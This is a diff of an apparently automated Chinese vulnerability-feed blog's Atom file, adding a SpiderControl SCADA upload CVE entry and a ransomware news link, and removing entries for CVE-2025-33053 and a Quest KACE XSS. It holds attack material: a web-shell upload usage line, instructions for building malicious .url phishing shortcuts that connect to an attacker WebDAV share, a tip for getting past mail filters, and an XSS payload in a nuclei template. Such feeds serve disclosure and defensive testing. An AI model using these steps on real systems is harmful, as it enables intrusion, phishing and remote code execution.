@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-12T07:48:49.121Z</updated>
+  <updated>2025-06-12T08:15:14.046Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,59 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SpiderControl SCADA Web Server 文件上传漏洞</title>
+    <link href="http://example.com/2025/06/12/github_4044651606/"/>
+    <id>http://example.com/2025/06/12/github_4044651606/</id>
+    <published>2025-06-12T08:15:14.047Z</published>
+    <updated>2025-06-12T08:15:14.046Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SpiderControl SCADA Web Server 文件上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-8232</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> SpiderControl SCADA Web Server存在未经验证的任意文件上传漏洞，攻击者可上传恶意脚本（如Web Shell）并实现远程代码执行。</p><p><strong>产品厂商：</strong> iniNet Solutions GmbH</p><p><strong>产品名称：</strong> SpiderControl SCADA Web Server</p><p><strong>来源：</strong> <a href="https://github.com/z3usx01/CVE-2024-8232">https://github.com/z3usx01/CVE-2024-8232</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-8232-–-SpiderControl-SCADA-Web-Server-File-Upload-Vulnerability"><a href="#CVE-2024-8232-–-SpiderControl-SCADA-Web-Server-File-Upload-Vulnerability" class="headerlink" title="CVE-2024-8232 – SpiderControl SCADA Web Server File Upload Vulnerability"></a>CVE-2024-8232 – SpiderControl SCADA Web Server File Upload Vulnerability</h2><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>SpiderControl SCADA Web Server is vulnerable to unauthenticated arbitrary file uploads, allowing attackers to upload malicious scripts (e.g., web shells) and gain remote code execution.</p><ul><li><strong>CVE ID</strong>: CVE-2024-8232</li><li><strong>Vendor</strong>: iniNet Solutions GmbH</li><li><strong>Affected Product</strong>: SpiderControl SCADA Web Server</li><li><strong>Impact</strong>: Remote Code Execution</li><li><strong>Exploit Type</strong>: Unauthenticated File Upload</li></ul><h3 id="⚠-Disclaimer"><a href="#⚠-Disclaimer" class="headerlink" title="⚠ Disclaimer"></a>⚠ Disclaimer</h3><p>This proof of concept is for educational purposes <strong>only</strong>. Do not use against systems without explicit authorization.</p><h3 id="🛠️-Usage"><a href="#🛠️-Usage" class="headerlink" title="🛠️ Usage"></a>🛠️ Usage</h3><pre><code class="language-bash">python3 poc.py http://TARGET-IP upload.php shell.php</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; SpiderControl SCADA Web Server 文件上传漏洞&lt;/</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
+    
+    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>韩国线上书店与票务平台Yes24 遭勒索软件攻击导致停机</title>
+    <link href="http://example.com/2025/06/12/weixin_3441928051/"/>
+    <id>http://example.com/2025/06/12/weixin_3441928051/</id>
+    <published>2025-06-12T08:11:07.875Z</published>
+    <updated>2025-06-12T08:11:07.873Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/v9FxmIn6kuw4HMYqoZjfHQ">https://mp.weixin.qq.com/s/v9FxmIn6kuw4HMYqoZjfHQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/v9FxmIn6kuw4HMYqoZjfHQ&quot;&gt;https://mp.weixin.qq.c</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Windows Server Password Expiry Setting Check Vulnerability</title>
@@ -491,59 +544,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Apache2 WebDAV 恶意 .url 快捷方式漏洞</title>
-    <link href="http://example.com/2025/06/12/github_1036467525/"/>
-    <id>http://example.com/2025/06/12/github_1036467525/</id>
-    <published>2025-06-12T07:00:19.935Z</published>
-    <updated>2025-06-12T07:00:19.934Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache2 WebDAV 恶意 .url 快捷方式漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-33053</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 此漏洞利用Apache2配置的WebDAV服务器和恶意.url快捷方式文件，可能被用于钓鱼、红队演练或横向移动模拟。通过特定的配置，点击恶意.url文件可能导致目标系统自动连接到攻击者的WebDAV服务器，从而可能执行未授权的命令或交付恶意负载。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache2</p><p><strong>来源：</strong> <a href="https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept">https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>gen_url.py</li><li>setup_webdav.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-33053-Proof-Of-Concept"><a href="#CVE-2025-33053-Proof-Of-Concept" class="headerlink" title="CVE-2025-33053 Proof Of Concept"></a>CVE-2025-33053 Proof Of Concept</h2><p>This repository provides scripts to <strong>automatically deploy a WebDAV server on Ubuntu using Apache2</strong>, and generate <strong>malicious <code>.url</code> shortcut files</strong> for use in phishing, red teaming, or lateral movement simulation.</p><hr><h3 id="📁-Contents"><a href="#📁-Contents" class="headerlink" title="📁 Contents"></a>📁 Contents</h3><ul><li><code>setup_webdav.sh</code> – Bash script to configure Apache2 + WebDAV with authentication.</li><li><code>setup_webdav.py</code> – Python version of the above.</li><li><code>gen_url.py</code> – Python script to generate <code>.url</code> shortcut files with UNC&#x2F;WebDAV paths.</li><li><code>README.md</code> – Documentation.</li></ul><hr><h3 id="🔧-Requirements"><a href="#🔧-Requirements" class="headerlink" title="🔧 Requirements"></a>🔧 Requirements</h3><ul><li>OS: Ubuntu 20.04 or newer (Debian-compatible)</li><li>Root privileges (<code>sudo</code>)</li><li>Python 3.x</li></ul><hr><h3 id="🚀-Setup-Instructions"><a href="#🚀-Setup-Instructions" class="headerlink" title="🚀 Setup Instructions"></a>🚀 Setup Instructions</h3><h4 id="1-WebDAV-Server-via-Bash"><a href="#1-WebDAV-Server-via-Bash" class="headerlink" title="1. WebDAV Server (via Bash)"></a>1. WebDAV Server (via Bash)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> bash setup_webdav.sh<br></code></pre></td></tr></table></figure><p>Or using Python:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> python3 setup_webdav.py<br></code></pre></td></tr></table></figure><p>By default, the script will:</p><ul><li>Install Apache and required WebDAV modules.</li><li>Create a shared directory at <code>/var/www/html/webdav</code>.</li><li>Enable <code>DAV</code> and <code>DAV_FS</code> modules.</li><li>Configure an Apache virtual host with authentication:<ul><li>Username: <code>webdavuser</code></li><li>Password: <code>Web@123</code></li></ul></li><li>Create a <code>DavLockDB</code> directory (to prevent Apache DAV locking errors).</li><li>Restart the Apache service.</li></ul><blockquote><p>📎 WebDAV path: <code>http://&lt;your-ip&gt;/webdav/</code></p></blockquote><hr><h3 id="💣-Generating-a-Malicious-url-Shortcut"><a href="#💣-Generating-a-Malicious-url-Shortcut" class="headerlink" title="💣 Generating a Malicious .url Shortcut"></a>💣 Generating a Malicious <code>.url</code> Shortcut</h3><h4 id="Example-usage"><a href="#Example-usage" class="headerlink" title="Example usage:"></a>Example usage:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 gen_url.py --ip 192.168.1.100 --out doc.url<br></code></pre></td></tr></table></figure><h4 id="All-Options"><a href="#All-Options" class="headerlink" title="All Options:"></a>All Options:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 gen_url.py \<br>  --ip 192.168.1.100 \<br>  --share webdav \<br>  --out finance_report.url \<br>  --exe <span class="hljs-string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span> \<br>  --icon <span class="hljs-string">&quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&quot;</span> \<br>  --index 13 \<br>  --modified 20F06BA06D07BD014D<br></code></pre></td></tr></table></figure><p>This will create a <code>.url</code> file like:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[InternetShortcut]</span><br><span class="hljs-attr">URL</span>=C:\Windows\System32\calc.exe<br><span class="hljs-attr">WorkingDirectory</span>=\\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>\webdav\<br><span class="hljs-attr">ShowCommand</span>=<span class="hljs-number">7</span><br><span class="hljs-attr">IconIndex</span>=<span class="hljs-number">13</span><br><span class="hljs-attr">IconFile</span>=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe<br><span class="hljs-attr">Modified</span>=<span class="hljs-number">20</span>F06BA06D07BD014D<br></code></pre></td></tr></table></figure><blockquote><p>📌 Clicking this file (in certain configurations) may cause the target system to auto-connect to your WebDAV server (authentication or DLL delivery).</p></blockquote><hr><h3 id="🔒-Notes-for-Security-Testing"><a href="#🔒-Notes-for-Security-Testing" class="headerlink" title="🔒 Notes for Security Testing"></a>🔒 Notes for Security Testing</h3><ul><li><strong>Disable Firewall (or open port 80)</strong> if testing on a local network:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw allow 80<br></code></pre></td></tr></table></figure></li><li><code>.url</code> files may not execute as expected depending on:<ul><li>Group Policy restrictions</li><li>Application defaults</li><li>Email client (Gmail may sanitize them)</li></ul></li><li>You may need to zip or rename <code>.url</code> to <code>.txt</code> to bypass filters.</li></ul><hr><h3 id="⚠️-Legal-Disclaimer"><a href="#⚠️-Legal-Disclaimer" class="headerlink" title="⚠️ Legal Disclaimer"></a>⚠️ Legal Disclaimer</h3><p>This repository is for <strong>educational and authorized penetration testing only</strong>.<br><strong>Do not use</strong> these scripts against systems you do not own or have permission to test.</p><hr><h3 id="🧠-References"><a href="#🧠-References" class="headerlink" title="🧠 References"></a>🧠 References</h3><ul><li><a href="https://linuxconfig.org/webdav-server-setup-on-ubuntu-linux">WebDAV Server Setup - LinuxConfig.org</a></li><li><a href="https://www.petergirnus.com/blog/setup-configure-a-webdav-server-ubuntu-linux-apache">WebDAV Apache Config - Peter Girnus</a></li><li><a href="https://learn.microsoft.com/en-us/iis/publish/using-webdav/using-webdav-with-iis">Microsoft WebDAV Docs</a></li></ul><hr><h3 id="📬-Contact"><a href="#📬-Contact" class="headerlink" title="📬 Contact"></a>📬 Contact</h3><p>For questions or ethical red teaming requests, reach out via GitHub issues.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache2 WebDAV 恶意 .url 快捷方式漏洞&lt;/p&gt;
-&lt;p&gt;&lt;s</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Quest KACE SMA /common/run_cross_report.php &#39;fmt&#39; XSS</title>
-    <link href="http://example.com/2025/06/12/github_1830981960/"/>
-    <id>http://example.com/2025/06/12/github_1830981960/</id>
-    <published>2025-06-12T06:45:21.021Z</published>
-    <updated>2025-06-12T06:45:21.017Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Quest KACE SMA &#x2F;common&#x2F;run_cross_report.php ‘fmt’ XSS</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-11133</li></ul><p><strong>漏洞类型：</strong> 跨站可执行脚本</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Quest KACE系统管理设备的’&#x2F;common&#x2F;run_cross_report.php’脚本中的’fmt’参数容易受到跨站脚本攻击。</p><p><strong>产品厂商：</strong> quest</p><p><strong>产品名称：</strong> kace_system_management_appliance</p><p><strong>影响版本：</strong> 8.0.318</p><p><strong>搜索语法：</strong> title:”KACE Systems Management”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/4c0d694dd0a6c19f5b7621a849184d6a5003b332/http%2Fcves%2F2018%2FCVE-2018-11133.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/4c0d694dd0a6c19f5b7621a849184d6a5003b332/http%2Fcves%2F2018%2FCVE-2018-11133.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11133</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Quest KACE SMA <span class="hljs-symbol">/common/run_cross_report.php</span> &#x27;fmt&#x27; XSS<br>  <span class="hljs-params">author:</span> iamnoooob,pdresearch<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    The &#x27;fmt&#x27; parameter of the &#x27;<span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>run_cross_report.php&#x27; script <span class="hljs-keyword">in</span> the the Quest KACE System Management Appliance <span class="hljs-number">8.0</span>.<span class="hljs-number">318</span> is vulnerable to cross-site scripting.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-11133</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:R<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:L<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">6.1</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">11133</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">79</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00298</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.52729</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:quest:kace_system_management_appliance:<span class="hljs-number">8.0</span>.<span class="hljs-number">318</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> quest<br>    <span class="hljs-params">product:</span> kace_system_management_appliance<br>    <span class="hljs-params">shodan-query:</span> title:<span class="hljs-string">&quot;KACE Systems Management&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2018,xss,quest,kace,sma<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>run_cross_report.php<span class="hljs-operator">?</span>uniqueId<span class="hljs-operator">=</span><span class="hljs-number">366314513</span>&amp;id<span class="hljs-operator">=</span><span class="hljs-number">585</span>&amp;org<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;fmt<span class="hljs-operator">=</span>xls34403&#x27;)%<span class="hljs-number">3</span>balert(document.domain)%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f952 HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;xls34403&#x27;);alert(document.domain)//952&#x27;);&quot;</span><br>          <span class="hljs-operator">-</span> &#x27;k-run-report-message&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Quest KACE SMA &amp;#x2F;common&amp;#x2F;run_cr</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="跨站可执行脚本" scheme="http://example.com/tags/%E8%B7%A8%E7%AB%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"/>
     
   </entry>
   
